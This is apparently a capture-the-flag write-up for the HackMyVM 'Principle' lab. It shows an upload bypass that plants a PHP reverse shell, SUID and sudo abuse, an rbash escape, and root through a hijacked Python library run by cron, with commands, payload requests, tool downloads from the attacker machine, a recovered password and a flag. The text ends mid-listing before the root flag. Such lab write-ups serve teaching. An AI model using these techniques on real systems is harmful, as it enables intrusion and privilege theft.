| Name      | Difficulty | OS    | Target IP     | Link                                                  |
| --------- | ---------- | ----- | ------------- | ----------------------------------------------------- |
| Principle | Medium     | Linux | 192.168.0.146 | https://hackmyvm.eu/machines/machine.php?vm=Principle |
### ARP Scan

```bash
garffff@garffff:~/hackmyvm/principle$ sudo arp-scan -l | grep 5a
192.168.0.210	08:00:27:d1:20:5a	PCS Systemtechnik GmbH
```

### Nmap Scan Results

```bash
garffff@garffff:~/hackmyvm/principle$ sudo nmap -p- -sV -sC 192.168.0.210 -oA nmap/principle.tcp
Starting Nmap 7.80 ( https://nmap.org ) at 2024-08-02 18:38 BST
Nmap scan report for 192.168.0.210
Host is up (0.00050s latency).
Not shown: 65534 filtered ports
PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.22.1
| http-robots.txt: 1 disallowed entry 
|_/hackme
|_http-server-header: nginx/1.22.1
|_http-title: Welcome to nginx!
MAC Address: 08:00:27:D1:20:5A (Oracle VirtualBox virtual NIC)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 111.05 seconds
```

Since we only have port 80, let's view it in a browser.
### Exploring Port 80

Nothing here, but Nmap picked up a robots.txt

![[Pasted image 20240802183953.png]]

Viewing `robots.txt`:

![[Pasted image 20240802183929.png]]
Looks like we have some clues, I will view these individually:

`/hi.html`:

![[Pasted image 20240802184024.png]]

`/investigate`:

![[Pasted image 20240802184100.png]]

Viewing the source: 

![[Pasted image 20240802184126.png]]

We see the HTML commets:

```bash
<!-- If you like research, I will try to help you to solve the enigmas, try to search for documents in this directory -->
```

Viewing `/hackme`  gave me nothing.

Investigating the investigate directory:

```bash
garffff@garffff:~/hackmyvm/principle$ feroxbuster -u http://192.168.0.146/investigate/ -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x ,.txt,.html,.php,.docx,.pdf

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.0.146/investigate/
 🚀  Threads               │ 50
 📖  Wordlist              │ /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.0
 🔎  Extract Links         │ true
 💲  Extensions            │ [, txt, html, php, docx, pdf]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        7l       11w      153c http://192.168.0.146/investigate/investigate
404      GET        7l       11w      153c http://192.168.0.146/investigate/hi.html
404      GET        7l       11w      153c http://192.168.0.146/investigate/hackme
404      GET        7l       11w      153c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET       23l       94w      812c http://192.168.0.146/investigate/index.html
200      GET       31l       50w      432c http://192.168.0.146/investigate/styles.css
200      GET      320l     1953w   165160c http://192.168.0.146/investigate/talos.jpg
200      GET       23l       94w      812c http://192.168.0.146/investigate/
200      GET        8l        8w      596c http://192.168.0.146/investigate/rainbow_mystery.txt
[####################] - 2m   1543857/1543857 0s      found:8       errors:0      
[####################] - 2m   1543822/1543822 13198/s http://192.168.0.146/investigate/
```

We see the file `rainbow_mystery.txt`.  Viewing this file to be base64 encoded:

![[Pasted image 20240802184400.png]]
Echoing the text and decoding within a terminal window:

```bash
garffff@garffff:~/hackmyvm/principle$ echo 'QWNjb3JkaW5nIHRvIHRoZSBPbGQgVGVzdGFtZW50LCB0aGUgcmFpbmJvdyB3YXMgY3JlYXRlZCBi
eSBHb2QgYWZ0ZXIgdGhlIHVuaXZlcnNhbCBGbG9vZC4gSW4gdGhlIGJpYmxpY2FsIGFjY291bnQs
IGl0IHdvdWxkIGFwcGVhciBhcyBhIHNpZ24gb2YgdGhlIGRpdmluZSB3aWxsIGFuZCB0byByZW1p
bmQgbWVuIG9mIHRoZSBwcm9taXNlIG1hZGUgYnkgR29kIGhpbXNlbGYgdG8gTm9haCB0aGF0IGhl
IHdvdWxkIG5ldmVyIGFnYWluIGRlc3Ryb3kgdGhlIGVhcnRoIHdpdGggYSBmbG9vZC4KTWF5YmUg
dGhhdCdzIHdoeSBJIGFtIGEgcm9ib3Q/Ck1heWJlIHRoYXQgaXMgd2h5IEkgYW0gYWxvbmUgaW4g
dGhpcyB3b3JsZD8KClRoZSBhbnN3ZXIgaXMgaGVyZToKLS4uIC0tLSAtLSAuLSAuLiAtLiAvIC0g
Li4uLi0gLi0uLiAtLS0tLSAuLi4gLi0uLS4tIC4uLi4gLS0gLi4uLQo=
' | base64 -d
According to the Old Testament, the rainbow was created by God after the universal Flood. In the biblical account, it would appear as a sign of the divine will and to remind men of the promise made by God himself to Noah that he would never again destroy the earth with a flood.
Maybe that's why I am a robot?
Maybe that is why I am alone in this world?

The answer is here:
-.. --- -- .- .. -. / - ....- .-.. ----- ... .-.-.- .... -- ...-
```

Where it says `The answer is here`, this appears be be Morse code. I will use this site to decode it: https://capitalizemytitle.com/morse-code-translator/

![[Pasted image 20240802184444.png]]

We have a domain name. I will adding this to my host file:

```bash
garffff@garffff:~/hackmyvm/principle$ sudo nano /etc/hosts
```

And paste in what I have found:

![[Pasted image 20240802184640.png|center]]

Going to this new domain takes us to another page:

![[Pasted image 20240804132431.png]]

Not able to find much on this page, further enumeration was conducted:
### Subdomain enumeration:

```bash
garffff@garffff:~/hackmyvm/principle$ /opt/ffuf/ffuf -u http://t4l0s.hmv -w /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.t4l0s.hmv" -fs 615

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://t4l0s.hmv
 :: Wordlist         : FUZZ: /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.t4l0s.hmv
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response size: 615
________________________________________________

hellfire                [Status: 200, Size: 1659, Words: 688, Lines: 52, Duration: 7ms]
:: Progress: [114441/114441] :: Job [1/1] :: 10000 req/sec :: Duration: [0:00:12] :: Errors: 0 ::
```

Adding this to my host file:

![[Pasted image 20240802184916.png]]

Visiting the new subdomain:

![[Pasted image 20240802184954.png]]

The text shows:

```bash
[elohim@principle ~]$ echo "Road to $HOME, but you don't have access to the System. You should not look for the way, you have been warned." Road to /gehenna, but you don't have access to the System. You should not look for the way, you have been warned.
```

Nothing much here, I will continue to do a directory bruteforce:

```bash
garffff@garffff:~/hackmyvm/principle$ feroxbuster -u http://hellfire.t4l0s.hmv/ -w /opt/SecLists/Discovery/Web-Content/big.txt -x ,.txt,.html,.php

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://hellfire.t4l0s.hmv/
 🚀  Threads               │ 50
 📖  Wordlist              │ /opt/SecLists/Discovery/Web-Content/big.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.0
 🔎  Extract Links         │ true
 💲  Extensions            │ [, txt, html, php]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        7l       11w      153c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET       51l      174w     1659c http://hellfire.t4l0s.hmv/
301      GET        7l       11w      169c http://hellfire.t4l0s.hmv/archivos => http://hellfire.t4l0s.hmv/archivos/
200      GET       51l      174w     1659c http://hellfire.t4l0s.hmv/index.php
200      GET       28l       71w      748c http://hellfire.t4l0s.hmv/upload.php
200      GET       61l      110w     1350c http://hellfire.t4l0s.hmv/output.php
[####################] - 16s   204795/204795  0s      found:5       errors:0      
[####################] - 14s   102385/102385  7108/s  http://hellfire.t4l0s.hmv/ 
[####################] - 14s   102385/102385  7104/s  http://hellfire.t4l0s.hmv/archivos/                                              
```

We have three files and the directory `archivos`

Visiting `uploads.php`:

![[Pasted image 20240802185228.png]]

Using the upload function, I uploaded a jpg file, to see what is going on:

![[Pasted image 20240802185312.png]]

Not retentive, but I found a Reflective Cross-Site Scripting (XSS) Vulnerability - No use:

![[Pasted image 20240802185415.png]]

Once the images are uploaded, they are stored in the `archivos` directory which can be viewed directly.

### Obtaining a Shell:

The hack much be a file upload bypass. Should be straight forward enough. One of the first things I like to do is to change the content type as shown further down. For now, I will prep everything in order to obtain a shell connection.

I will use the `php-reverse-shell.php` from seclists:

```bash
garffff@garffff:~/hackmyvm/principle$ cp /opt/SecLists/Web-Shells/laudanum-0.8/php/php-reverse-shell.php .
garffff@garffff:~/hackmyvm/principle$ mv php-reverse-shell.php shell.php
garffff@garffff:~/hackmyvm/principle$ subl shell.php
```

And updated the php file to include my IP details:

![[Pasted image 20240802185713.png]]

Setting up a netcat reverse shell:

```bash
garffff@garffff:~/hackmyvm/principle$ sudo nc -lvp 8888
Listening on 0.0.0.0 8888
```

Back to the uploads page and selecting my shell.php, and intercepting the request in Burp Suite, I change the following headers:

- Content-Type: from `Content-Type: application/x-php` to `Content-Type: image/jpeg

Partial Payload:

```bash
POST /upload.php HTTP/1.1
Host: hellfire.t4l0s.hmv
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=---------------------------33227159827889126171334390175
Content-Length: 5719
Origin: http://hellfire.t4l0s.hmv
Connection: keep-alive
Referer: http://hellfire.t4l0s.hmv/upload.php
Upgrade-Insecure-Requests: 1
Priority: u=0, i

-----------------------------33227159827889126171334390175
Content-Disposition: form-data; name="archivo"; filename="shell.php"
Content-Type: image/jpeg

<?php
// php-reverse-shell - A Reverse Shell implementation in PHP
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
<--SNIP-->
```

Upload successfully. Browsing to: http://hellfire.t4l0s.hmv/archivos/shell.php gave me a reverse shell:

```bash
garffff@garffff:~/hackmyvm/principle$ sudo nc -lvp 8888
Listening on 0.0.0.0 8888
Connection received on hellfire.t4l0s.hmv 37764
Linux principle 6.1.0-9-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.27-1 (2023-05-08) x86_64 GNU/Linux
 14:03:10 up 26 min,  0 user,  load average: 0.00, 0.02, 0.08
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami && id
www-data
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Upgrading the shell connection:

```bash
$ whereis python3
python3: /usr/bin/python3 /usr/lib/python3 /etc/python3 /usr/share/python3 /usr/share/man/man1/python3.1.gz
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@principle:/$ ^Z
[1]+  Stopped                 sudo nc -lvp 8888
garffff@garffff:~/hackmyvm/principle$ stty raw -echo
sudo nc -lvp 8888ackmyvm/principle$ 


www-data@principle:/$ 
```

### Privilege Escalation to first user (Talos)

Looking for setuid bit set, I saw the `find` command as this bit set. Executing this command will run as Talos:

```bash
www-data@principle:~/html$ find / -perm -u=s -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/mount
/usr/bin/passwd
/usr/bin/sudo
/usr/bin/find
/usr/bin/su
/usr/bin/chsh
/usr/bin/umount
/usr/bin/newgrp
www-data@principle:~/html$ ls -lash /usr/bin/find
ls -lash /usr/bin/find
220K -rwsr-xr-x 1 talos root 220K Jan  8  2023 /usr/bin/find
```

Looking on gtfobin: https://gtfobins.github.io/gtfobins/find/

There is a simple command that allows us to obtain a shell as that user:

![[Pasted image 20240802190613.png]]

Using that command we have a shell as the Talos user, but we are not in the correct user group:

```bash
www-data@principle:~/html$ find . -exec /bin/bash -p \; -quit
find . -exec /bin/bash -p \; -quit
bash-5.2$ whoami && id
whoami && id
talos
uid=33(www-data) gid=33(www-data) euid=1000(talos) groups=33(www-data)
```

Exploring the home directory, we see a `note.txt`

```bash
bash-5.2$ cd /home/talos
cd /home/talos
bash-5.2$ ls -lash
ls -lash
total 40K
4.0K drwxr-xr-x 4 talos talos 4.0K Jul 14  2023 .
4.0K drwxr-xr-x 4 root  root  4.0K Jul  4  2023 ..
4.0K -rw-r--r-- 1 talos talos    1 Jul 14  2023 .bash_history
4.0K -rw-r----- 1 talos talos  261 Jul  5  2023 .bash_logout
4.0K -rw-r----- 1 talos talos 3.5K Jul 14  2023 .bashrc
4.0K -rw------- 1 talos talos   20 Jul  4  2023 .lesshst
4.0K drw-r----- 3 talos talos 4.0K Jun 30  2023 .local
4.0K -rw-r----- 1 talos talos  807 Jun 30  2023 .profile
4.0K drwx------ 2 talos talos 4.0K Jul 14  2023 .ssh
4.0K -rw-r----- 1 talos talos  320 Jul 13  2023 note.txt
bash-5.2$ cat note.txt
cat note.txt
Congratulations! You have made it this far thanks to the manipulated file I left you, I knew you would make it!
Now we are very close to finding this false God Elohim.
I left you a file with the name of one of the 12 Gods of Olympus, out of the eye of Elohim ;)
The tool I left you is still your ally. Good luck to you.

```

Not knowing my 12 gods of Olympus, I simply used `linpeas.sh` to help me enumerate the box further:

Found `/etc/selinux/Afrodita.key`

```bash
╔══════════╣ Searching *password* or *credential* files in home (limit 70)
/etc/pam.d/common-password
/etc/selinux/Afrodita.key
/usr/bin/systemd-ask-password
/usr/bin/systemd-tty-ask-password-agent
/usr/lib/grub/i386-pc/legacy_password_test.mod
/usr/lib/grub/i386-pc/password.mod
/usr/lib/grub/i386-pc/password_pbkdf2.mod
/usr/lib/systemd/system/multi-user.target.wants/systemd-ask-password-wall.path
/usr/lib/systemd/system/sysinit.target.wants/systemd-ask-password-console.path
/usr/lib/systemd/system/systemd-ask-password-console.path
/usr/lib/systemd/system/systemd-ask-password-console.service
/usr/lib/systemd/system/systemd-ask-password-wall.path
/usr/lib/systemd/system/systemd-ask-password-wall.service
  #)There are more creds/passwds files in the previous parent folde
```

Linpeas also found this. SSH is running on port `3445`, but it is not being allowed through the firewall. This may come in handy later:

```bash
╔══════════╣ Analyzing SSH Files (limit 70)





-rw-r--r-- 1 root root 176 Jun 30  2023 /etc/ssh/ssh_host_ecdsa_key.pub
-rw-r--r-- 1 root root 96 Jun 30  2023 /etc/ssh/ssh_host_ed25519_key.pub
-rw-r--r-- 1 root root 568 Jun 30  2023 /etc/ssh/ssh_host_rsa_key.pub

Port 3445
UsePAM yes
```

Examining Afrodita.key

```bash
bash-5.2$ ls -lash /etc/selinux/Afrodita.key
ls -lash /etc/selinux/Afrodita.key
4.0K -rwxr--r-- 1 root root 237 Jul 12  2023 /etc/selinux/Afrodita.key
```

Contains a password:

```bash
bash-5.2$  cat /etc/selinux/Afrodita.key
 cat /etc/selinux/Afrodita.key
Here is my password:
Hax0rModeON
```

Using password to switch to the Talos:

```bash
bash-5.2$ su talos
su talos
Password: Hax0rModeON
```

I am now in the correct group:

```bash
talos@principle:~$ whoami && id
whoami && id
talos
uid=1000(talos) gid=1000(talos) groups=1000(talos),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),100(users),106(netdev)
```

Using the `sudo -l` We can run `cp` as the elohim user:

```bash
talos@principle:~$ sudo -l
sudo -l
Matching Defaults entries for talos on principle:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User talos may run the following commands on principle:
    (elohim) NOPASSWD: /bin/cp
```

### Privilege Escalation to Second User (elohim)

I decided to create a pair private/public keys used for SSH. I then copied public key into `authoized_keys` within the target users `.ssh` directory:

```bash
talos@principle:~$ ssh-keygen
ssh-keygen
Generating public/private rsa key pair.
Enter file in which to save the key (/home/talos/.ssh/id_rsa): 

Enter passphrase (empty for no passphrase): 

Enter same passphrase again: 

Your identification has been saved in /home/talos/.ssh/id_rsa
Your public key has been saved in /home/talos/.ssh/id_rsa.pub
The key fingerprint is:
SHA256:Rs55J4JYr84rqI8w3Waxi5W2VUybSlrylml1dLkgy/M talos@principle
The key's randomart image is:
+---[RSA 3072]----+
|                 |
|             .   |
|      . + o o    |
|     o X B o .   |
|    + + S + o    |
| . . X O * o     |
|o ..X X   E      |
|.o.*.O           |
|ooo o.+.         |
+----[SHA256]-----+
```

Copying the key failed due to permission issues:

```bash
talos@principle:~$ sudo -u elohim cp /home/talos/.ssh/id_rsa.pub /home/gehenna/.ssh/authorized_keys
</.ssh/id_rsa.pub /home/gehenna/.ssh/authorized_keys
cp: cannot stat '/home/talos/.ssh/id_rsa.pub': Permission denied
```

However, I copied the public key to the `/tmp` directory:

```bash
talos@principle:~$ cp .ssh/id_rsa.pub /tmp
cp .ssh/id_rsa.pub /tmp
```

And copied again which was successful:

```bash
sudo -u elohim cp /home/talos/.ssh/id_rsa.pub
talos@principle:~/.ssh$ sudo -u elohim cp /tmp/id_rsa.pub /home/gehenna/.ssh/authorized_keys
< /tmp/id_rsa.pub /home/gehenna/.ssh/authorized_keys

```

We appear not to have access the `ssh` binary program on the box:

```bash
talos@principle:~/.ssh$ ssh -i id_rsa elohim@127.0.0.1 -p 3445
ssh -i id_rsa elohim@127.0.0.1 -p 3445
bash: /usr/bin/ssh: Permission denied

```

So, I copied my own ssh binary from my host machine to the target. I created a webserver to host this binary:

```bash
garffff@garffff:~/hackmyvm/principle$ cp /bin/ssh .
garffff@garffff:~/hackmyvm/principle$ sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.0.210 - - [02/Aug/2024 19:27:25] "GET /ssh HTTP/1.1" 200 -

```

I copied  it over, and made it executable:

```bash
talos@principle:~$ wget http://192.168.0.51/ssh
wget http://192.168.0.51/ssh
--2024-08-04 09:12:41--  http://192.168.0.51/ssh
Connecting to 192.168.0.51:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 846888 (827K) [application/octet-stream]
Saving to: ‘ssh’

ssh                 100%[===================>] 827.04K  --.-KB/s    in 0.02s   

2024-08-04 09:12:41 (49.4 MB/s) - ‘ssh’ saved [846888/846888]

talos@principle:~$ ls -lash
ls -lash
total 868K
4.0K drwxr-xr-x 4 talos talos 4.0K Aug  2 14:27 .
4.0K drwxr-xr-x 4 root  root  4.0K Jul  4  2023 ..
4.0K -rw-r--r-- 1 talos talos    1 Jul 14  2023 .bash_history
4.0K -rw-r----- 1 talos talos  261 Jul  5  2023 .bash_logout
4.0K -rw-r----- 1 talos talos 3.5K Jul 14  2023 .bashrc
4.0K -rw------- 1 talos talos   20 Jul  4  2023 .lesshst
4.0K drw-r----- 3 talos talos 4.0K Jun 30  2023 .local
4.0K -rw-r----- 1 talos talos  320 Jul 13  2023 note.txt
4.0K -rw-r----- 1 talos talos  807 Jun 30  2023 .profile
4.0K drwx------ 2 talos talos 4.0K Aug  2 14:16 .ssh
828K -rw-rw-rw- 1 talos talos 828K Aug  2 14:27 ssh
talos@principle:~$ chmod +x ssh
chmod +x ssh
talos@principle:~$ ls -lash
ls -lash
total 868K
4.0K drwxr-xr-x 4 talos talos 4.0K Aug  2 14:27 .
4.0K drwxr-xr-x 4 root  root  4.0K Jul  4  2023 ..
4.0K -rw-r--r-- 1 talos talos    1 Jul 14  2023 .bash_history
4.0K -rw-r----- 1 talos talos  261 Jul  5  2023 .bash_logout
4.0K -rw-r----- 1 talos talos 3.5K Jul 14  2023 .bashrc
4.0K -rw------- 1 talos talos   20 Jul  4  2023 .lesshst
4.0K drw-r----- 3 talos talos 4.0K Jun 30  2023 .local
4.0K -rw-r----- 1 talos talos  320 Jul 13  2023 note.txt
4.0K -rw-r----- 1 talos talos  807 Jun 30  2023 .profile
4.0K drwx------ 2 talos talos 4.0K Aug  2 14:16 .ssh
828K -rwxrwxrwx 1 talos talos 828K Aug  2 14:27 ssh
```

Now I can access the `elohim` user using SSH:

```bash
talos@principle:~$ ./ssh -i .ssh/id_rsa elohim@127.0.0.1 -p 3445
./ssh -i .ssh/id_rsa elohim@127.0.0.1 -p 3445
The authenticity of host '[127.0.0.1]:3445 ([127.0.0.1]:3445)' can't be established.
ED25519 key fingerprint is SHA256:DKEXWHITnUq09/ftlMqD6Eo+e5eQoeR+HWleDkUB9fw.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
yes
Warning: Permanently added '[127.0.0.1]:3445' (ED25519) to the list of known hosts.


Son, you didn't listen to me, and now you're trapped.
You've come a long way, but this is the end of your journey.

elohim@principle:~$ whoami && id
whoami && id
elohim
uid=1001(elohim) gid=1001(elohim) groups=1001(elohim),1002(sml)
elohim@principle:~$ ls -lash
ls -lash
total 40K
4.0K drwxr-xr-x 4 elohim elohim 4.0K Jul 14  2023 .
4.0K drwxr-xr-x 4 root   root   4.0K Jul  4  2023 ..
4.0K -rw------- 1 elohim elohim  289 Jul 14  2023 .bash_history
4.0K -rw-r----- 1 elohim elohim  261 Jul  5  2023 .bash_logout
4.0K -rw-r----- 1 elohim elohim 3.8K Jul 14  2023 .bashrc
4.0K -rw-r----- 1 elohim elohim  777 Jul 13  2023 flag.txt
4.0K drw-r----- 3 elohim elohim 4.0K Jul  2  2023 .local
4.0K -rw-r----- 1 elohim elohim   21 Jul 12  2023 .lock
4.0K -rw-r----- 1 elohim elohim  807 Jul  6  2023 .profile
4.0K drwx------ 2 elohim elohim 4.0K Jul  6  2023 .ssh
```

I have landed in a restricted shell (rbash):

```bash
elohim@principle:~$ cat flag.txt
cat flag.txt
rbash: cat:: No such file or directory
```

### Escaping rbash

I created a Simple Python script, saved locally on my host as `shell.py`:

```bash
import os; os.system("/bin/bash")
```

Using `wget`, I copied the file over and executing it:

```bash
elohim@principle:~$ wget http://192.168.0.51/shell.py
wget http://192.168.0.51/shell.py
--2024-08-03 08:48:13--  http://192.168.0.51/shell.py
Connecting to 192.168.0.51:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 31 [text/x-python]
Saving to: ‘shell.py’

shell.py            100%[===================>]      31  --.-KB/s    in 0s      

2024-08-03 08:48:13 (217 KB/s) - ‘shell.py’ saved [31/31
```

I can now read the first user flag:

```bash
$ cat flag.txt
cat flag.txt
                           _
                          _)\.-.
         .-.__,___,_.-=-. )\`  a`\_
     .-.__\__,__,__.-=-. `/  \     `\
     {~,-~-,-~.-~,-,;;;;\ |   '--;`)/
      \-,~_-~_-,~-,(_(_(;\/   ,;/
       ",-.~_,-~,-~,)_)_)'.  ;;(
         `~-,_-~,-~(_(_(_(_\  `;\
   ,          `"~~--,)_)_)_)\_   \
   |\              (_(_/_(_,   \  ;
   \ '-.       _.--'  /_/_/_)   | |
    '--.\    .'          /_/    | |
        ))  /       \      |   /.'
       //  /,        | __.'|  ||
      //   ||        /`    (  ||
     ||    ||      .'       \ \\
     ||    ||    .'_         \ \\
      \\   //   / _ `\        \ \\__
       \'-'/(   _  `\,;        \ '--:,
        `"`  `"` `-,,;         `"`",,;


CONGRATULATIONS, you have defeated me!

The flag is:
K|tW4bw7$zNh'PwSh/jN

```

## Privilege Escalation to Root: 

Using `sudo -l` we can see we can using the script `/usr/bin/python3 /opt/reviewer.py` as root

```bash
$ sudo -l
sudo -l
Matching Defaults entries for elohim on principle:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User elohim may run the following commands on principle:
    (root) NOPASSWD: /usr/bin/python3 /opt/reviewer.py
```

Code:

```bash
cat /opt/reviewer.py
#!/usr/bin/python3

import os
import subprocess

def eliminar_archivos_incorrectos(directorio):
    extensiones_validas = ['.jpg', '.png', '.gif']
    
    for nombre_archivo in os.listdir(directorio):
        archivo = os.path.join(directorio, nombre_archivo)
        
        if os.path.isfile(archivo):
            _, extension = os.path.splitext(archivo)
            
            if extension.lower() not in extensiones_validas:
                os.remove(archivo)
                print(f"Archivo eliminado: {archivo}")

directorio = '/var/www/hellfire.t4l0s.hmv/archivos'

eliminar_archivos_incorrectos(directorio)

def enviar_mensaje_usuarios_conectados():
    proceso = subprocess.Popen(['who'], stdout=subprocess.PIPE)
    salida, _ = proceso.communicate()
    lista_usuarios = salida.decode().strip().split('\n')
    usuarios_conectados = [usuario.split()[0] for usuario in lista_usuarios]
    mensaje = f"I have detected an intruder, stealing accounts: {', '.join(usuarios_conectados)}"
    subprocess.run(['wall', mensaje])

enviar_mensaje_usuarios_conectados()
```

Using linpeas we find this:

```
╔══════════╣ Interesting GROUP writable files (not in Home) (max 500)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-files
  Group sml:
/usr/lib/python3.11/subprocess.py
```

And also this:

The script `/opt/reviewer.py` is being executed every 5 minutes:

```bash
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

*/5 * * * *	root	/opt/reviewer.py
17 *	* * *	root	cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
47 6	* * 7	root	test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
52 6	1 * *	root	test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }

```

The `subprocess.py` is  being execute by the script as `import subprocess` is being used when ever it runs, and we have permissions to modify it.

We can simply verify this:

```
$ id 
id 
uid=1001(elohim) gid=1001(elohim) groups=1001(elohim),1002(sml)
$ ls -lash /usr/lib/python3.11/subprocess.py
ls -lash /usr/lib/python3.11/subprocess.py
84K -rw-rw-r-- 1 root sml 84K Jul 11  2023 /usr/lib/python3.11/subprocess.py

```

I copied `subprocess.py` to my host, I added the following code:

![[Pasted image 20240802195146.png]]

I copied the file back to target:

```bash
$ wget http://192.168.0.51/subprocess.py 
wget http://192.168.0.51/subprocess.py 
--2024-08-03 08:54:33--  http://192.168.0.51/subprocess.py
Connecting to 192.168.0.51:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 85786 (84K) [text/x-python]
Saving to: ‘subprocess.py’

subprocess.py       100%[===================>]  83.78K  --.-KB/s    in 0.001s  

2024-08-03 08:54:33 (157 MB/s) - ‘subprocess.py’ saved [85786/85786]

```

Overwrited the exising file on the target:

```bash
$ /bin/cp subprocess.py /usr/lib/python3.11/subprocess.py
/bin/cp subprocess.py /usr/lib/python3.11/subprocess.py
```

I also looked at the permissions for `/bin/bash`:

```
$ ls -lash /bin/bash
ls -lash /bin/bash
1.3M -rwxr-xr-x 1 root root 1.3M Apr 23  2023 /bin/bash
```

I decided to wait 5 minutes. The following message confirms the `reviewer.py` script has been executed:

```bash
Broadcast message from root@principle (somewhere) (Fri Aug  2 14:50:01 2024):  
                                                                               
I have detected an intruder, stealing accounts: elohim
```

Looking at `/bin/bash` again, we see the SUID bit has been set:

```bash
$ ls -lash /bin/bash
ls -lash /bin/bash
1.3M -rwsr-xr-x 1 root root 1.3M Apr 23  2023 /bin/bash
```

Executing bash we get to the root user:

```bash
$ /bin/bash -p
/bin/bash -p
bash-5.2# whoami && id
whoami && id
root
uid=1001(elohim) gid=1001(elohim) euid=0(root) groups=1001(elohim),1002(sml)
bash-5.2# cd /root
cd /root
bash-5.2# ls -lash
ls -lash
total 40K
4.0K drwx------  5 root root 4.0K Jul 14  2023 .
4.0K drwxr-xr-x 18 root root 4.0K Jul 11  2023 ..
   0 -rw-------  1 root root    0 Jul 14  2023 .bash_history
4.0K -rw-r--r--  1 root root  597 Jul  7  2023 .bashrc
4.0K drwx------  3 root root 4.0K Jul  3  2023 .config
4.0K -rw-------  1 root root   20 Jul  6  2023 .lesshst
4.0K drwxr-xr-x  3 root root 4.0K Jun 30  2023 .local
4.0K -rw-r--r--  1 root root  161 Jul  9  2019 .profile
4.0K -rw-r-----  1 root root  478 Jul  7  2023 root.txt
4.0K -rw-r--r--  1 root root   66 Jul  6  2023 .selected_editor
4.0K drwx------  2 root root 4.0K Jul 13  2023 .ssh

```

And then we can finally read the root flag:

```bash
bash-5.2# cd /root
cd /root
bash-5.2# ls -lash
ls -lash
total 40K
4.0K drwx------  5 root root 4.0K Jul 14  2023 .
4.0K drwxr-xr-x 18 root root 4.0K Jul 11  2023 ..
   0 -rw-------  1 root root    0 Jul 14  2023 .bash_history
4.0K -rw-r--r--  1 root root  597 Jul  7  2023 .bashrc
4.0K drwx------  3 root root 4.0K Jul  3  2023 .config
4.0K -rw-------  1 root root   20 Jul  6  2023 .lesshst
